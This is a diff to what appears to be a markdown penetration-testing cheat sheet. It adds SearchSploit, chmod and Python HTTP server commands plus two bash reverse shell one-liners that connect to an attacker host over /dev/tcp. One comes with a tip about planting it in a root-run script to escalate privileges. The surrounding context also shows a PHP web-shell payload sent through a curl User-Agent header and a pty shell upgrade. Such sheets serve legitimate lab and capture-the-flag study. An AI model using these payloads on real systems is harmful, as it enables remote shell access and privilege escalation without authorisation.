@@ -79,6 +79,7 @@ john [path_to_file] --wordlist=[path to wordlist]
 
 
 ## Exploits
+### SearchSploit
 Exploit Database Archive Search After locating the exploit, copy it into the current directory.
 ```
 searchsploit -m [exploit_file_path]
@@ -96,6 +97,11 @@ ls -la
 - Change Permissions for a file or directory:
 ```
 chmod ### [file] or [directory]
+```
+
+- Need to change a file to an executable?
+```
+chmod +x [path_to_file | file_name]
 ```
 
 - Another way of changing permissions over a directory is:
@@ -134,4 +140,18 @@ curl [ip or domain name] -H "User-Agent:<?php system(\$_GET['c']); ?>"
 Maybe you need to switch users, maybe you prefer BASH - either way you need to spawn an interactive shell. Also, `echo $0` will inform you of which shell you're currently using. 
 ```
 python -c "import pty;pty.spawn('/bin/bash')"
+```
+
+### Python HTTP Server
+```
+sudo python -m http.server 80
+```
+
+### Bash Reverse Shell
+```
+bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+```
+> If there's a script that is executed by root, modifing the script file may be a priv escalation:
+```
+bash -i >& /dev/tcp/[attack_ip]/[attack_port] 0>&1; 
 ```
